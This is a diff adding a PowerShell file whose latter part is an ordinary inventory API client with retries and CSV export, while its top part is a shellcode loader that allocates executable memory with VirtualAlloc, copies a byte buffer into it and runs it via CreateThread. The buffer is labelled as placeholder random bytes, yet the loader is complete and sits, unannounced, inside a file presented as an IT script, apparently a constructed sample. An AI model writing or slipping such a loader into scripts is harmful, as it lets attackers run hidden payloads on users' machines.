@@ -1,0 +1,170 @@
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+try {
+    $NativeCode = @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public static class Win32Api
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+            uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+            uint dwFreeType);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+            uint dwCreationFlags, out uint lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+    }
+    "@
+
+    Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
+    $Buffer = [Byte[]] @(
+        0x10, 0xcf, 0x57, 0x5e, 0x6a, 0x15, 0xfc, 0x26, 0x49, 0x0d, 0xc2, 0xb0, 0x10, 0xf7, 0x13, 0x01,
+        0xca, 0x72, 0x66, 0x04, 0x8f, 0x33, 0x5e, 0xfb, 0x32, 0x5f, 0x95, 0xb8, 0x7c, 0x69, 0x94, 0xea,
+        0xdb, 0x53, 0xa2, 0x62, 0x51, 0x18, 0x96, 0xf0, 0xf8, 0x7a, 0x70, 0x97, 0xae, 0x4d, 0x23, 0xca,
+        0x76, 0x14, 0xb8, 0xf3, 0x67, 0xa9, 0x40, 0x5f, 0x77, 0x4f, 0x45, 0x4a, 0x8c, 0x77, 0x66, 0x44,
+        0xc0, 0xae, 0xc7, 0x16, 0x3e, 0x09, 0xbb, 0x9d, 0xbd, 0xec, 0xb2, 0xe8, 0xe0, 0xe4, 0xc4, 0x7c,
+        0x3e, 0x3c, 0xca, 0x5c, 0x65, 0x3a, 0xfa, 0xb7, 0x9c, 0x34, 0xb3, 0x46, 0x48, 0x00, 0x81, 0xe7,
+        0xfa, 0x22, 0xb6, 0x16, 0x3e, 0x20, 0xdf, 0x8e, 0x6c, 0xe6, 0x52, 0x22, 0xeb, 0x56, 0xb5, 0x34,
+        0x12, 0x09, 0x3b, 0xc5, 0xb9, 0x31, 0x5a, 0x63, 0x18, 0xbf, 0x30, 0x39, 0xde, 0x52, 0x21, 0x45,
+        0xf4, 0xbd, 0x49, 0x5b, 0x1d, 0x6f, 0x03, 0xef, 0x71, 0x09, 0x0c, 0xc3, 0x4b, 0xf2, 0x43, 0xc1,
+        0xb2, 0xce, 0xe8, 0x5c, 0x94, 0x79, 0x00, 0xb3, 0x8b, 0x66, 0x4f, 0x09, 0xab, 0xab, 0x57, 0x66,
+        0xbd, 0xc7, 0x99, 0xc6, 0x45, 0xfd, 0xba, 0xd0, 0xe9, 0x70, 0x63, 0x8d, 0xb9, 0x3b, 0xb5, 0x68,
+        0xdd, 0x37, 0xc1, 0x12, 0x74, 0x1f, 0x49, 0x0e, 0xc8, 0x55, 0xc3, 0x24, 0xb9, 0x5e, 0x0c, 0xaf,
+        0x24, 0x57, 0xd6, 0xbf, 0x5b, 0x0d, 0xd0, 0x0b, 0xbe, 0x54, 0x4f, 0xe8, 0x8b, 0x0f, 0x46, 0x05,
+        0x69, 0xb7, 0x99, 0xfb, 0xc1, 0x85, 0x90, 0xa9, 0x58, 0x4d, 0x16, 0xe9, 0x07, 0xca, 0x18, 0x42,
+        0xdb, 0x00, 0xa9, 0x7d, 0xa3, 0xf6, 0x1a, 0xe5, 0x3f, 0x6f, 0xaf, 0xe2, 0xe5, 0x8d, 0x96, 0x0a,
+        0x4e, 0xdb, 0xbf, 0x24, 0x6d, 0x00, 0x65, 0x95, 0xd2, 0x47, 0x05, 0x9b, 0x4f, 0x5f, 0x82, 0x4f,
+        0xab, 0x1d, 0x75, 0x88, 0xaa, 0x44, 0x1a, 0xfd, 0x54, 0xf9, 0x79, 0x95, 0xe3, 0xe2, 0xe3, 0x6f,
+        0x33, 0x83, 0xab, 0xa8, 0x1b, 0x26, 0xb6, 0x97, 0x0c, 0x2d, 0x55, 0xb0, 0x58, 0xe3, 0x7e, 0xff,
+        0xd0, 0x83
+    )
+
+    $HProcess = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+    if ($HProcess -eq [IntPtr]::Zero) {
+        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        return
+    }
+
+    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
+    $ThreadId = 0
+    $Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
+    [void][Win32Api]::WaitForSingleObject($Thread, 832)
+    [void][Win32Api]::CloseHandle($Thread)
+
+    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
+}
+catch {
+    Write-Warning "loader failed: $($_.Exception.Message)"
+}
+<#
+.SYNOPSIS
+    Calls the Contoso inventory API with retry and exports the server list.
+.DESCRIPTION
+    Wraps Invoke-RestMethod in a retry helper that backs off on transient errors
+    and gives up on client errors such as 401 or 404.
+    Pages are followed through the nextLink property until the collection is
+    exhausted, then the records are written to CSV.
+.NOTES
+    Author: IT Systems
+    Last updated: 2025-08-09
+#>
+
+[CmdletBinding()]
+param(
+    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
+    [string]$BaseUri = "https://api.internal.corp/v1",
+
+    [Parameter(Mandatory = $false)]
+    [ValidateRange(1, 10)]
+    [int]$MaxRetries = 4,
+    [int]$TimeoutSec = 60,
+
+    [int]$PageSize = 200,
+
+    [string]$ReportPath = 'C:\Reports\api-servers-2026-08-24.csv'
+)
+
+$ErrorActionPreference = 'Stop'
+
+$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+Set-StrictMode -Version 2.0
+
+$ApiKey = $env:CONTOSO_API_KEY
+if ([string]::IsNullOrWhiteSpace($ApiKey)) {
+    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
+}
+$headers = @{
+    Authorization = "Bearer $ApiKey"
+    Accept        = 'application/json'
+}
+
+function Invoke-ContosoApi {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Path,
+
+        [ValidateSet('Get', 'Post')]
+        [string]$Method = 'Get',
+
+        [object]$Body
+    )
+
+    $uri = "$BaseUri$Path"
+    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
+        try {
+            $params = @{
+                Uri         = $uri
+                Method      = $Method
+                Headers     = $headers
+                TimeoutSec  = $TimeoutSec
+                ErrorAction = 'Stop'
+            }
+            if ($Body) {
+                $params.Body = $Body | ConvertTo-Json -Depth 5
+                $params.ContentType = 'application/json'
+            }
+            return Invoke-RestMethod @params
+        }
+        catch {
+            $status = 0
+            if ($_.Exception.Response) {
+                $status = [int]$_.Exception.Response.StatusCode
+            }
+            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
+                throw
+            }
+            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
+        }
+    }
+}
+
+$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
+$records = @($page.items)
+while ($page.nextLink) {
+    $next = $page.nextLink.Replace($BaseUri, '')
+    $page = Invoke-ContosoApi -Path $next
+    $records += @($page.items)
+}
+$records | Select-Object id, name, status | Format-Table -AutoSize
+
+$records | Select-Object id, name, status | Export-Csv -NoTypeInformation -Path $ReportPath
